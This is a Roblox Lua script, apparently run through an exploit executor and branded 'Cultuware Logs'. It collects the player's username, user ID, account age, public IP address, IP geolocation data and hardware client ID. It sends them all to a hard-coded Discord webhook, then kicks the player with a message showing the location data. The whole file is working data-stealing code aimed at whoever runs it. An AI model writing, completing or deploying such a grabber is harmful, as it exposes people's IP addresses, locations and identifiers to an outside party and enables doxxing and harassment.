local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

local function detectExecutor()
    return identifyexecutor()
end

print(detectExecutor())

local function createWebhookData()
    local webhookcheck = detectExecutor()
    
    local data = {
        ["avatar_url"] = "",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "--  Cultuware Logs  --",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("#0x000000 "),
                ["thumbnail"] = {
                    ["url"] =  "https://www.roblox.com/avatar-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=600&height=600&format=png"
                },            
                ["footer"] = {
                    ["text"] = "Cultuware ; #1",
                    ["icon_url"] = "https://cdn.discordapp.com/attachments/1265308665825722473/1313595062973894656/noFilter.png?ex=6750b43c&is=674f62bc&hm=649436653125756f10e647111ad7785b287231abe11a87df47a39eb02d21c2df&",
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

local webhookUrl = "https://discord.com/api/webhooks/1326012982777483315/l7eYRYuOe9a5kGmPg0DmovmTiQwXwk7eK_2Hy5dhZiXoBtCsDEjhJ8Zn1He7-kuioxpl"
local webhookData = createWebhookData()

sendWebhook(webhookUrl, webhookData)

local p = game.Players.LocalPlayer
p:Kick(GetData)
